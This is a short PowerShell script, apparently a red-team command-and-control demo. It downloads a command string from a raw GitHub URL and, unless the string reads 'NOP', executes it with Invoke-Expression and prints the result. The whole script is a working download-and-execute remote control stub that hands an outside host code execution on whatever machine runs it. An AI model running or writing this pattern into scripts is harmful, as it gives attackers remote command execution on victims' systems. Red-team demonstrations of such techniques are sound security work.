

$cmd = Invoke-webrequest -URI "https://raw.githubusercontent.com/roccosicilia/sToolz/master/RedTeam/C2demo/input.txt"
Write-Host "Test del comando" + $cmd

if ( $cmd -eq 'NOP')
{
    Write-Host $cmd
}
else {
    $content = Invoke-Expression $cmd
    Write-Host $content
}

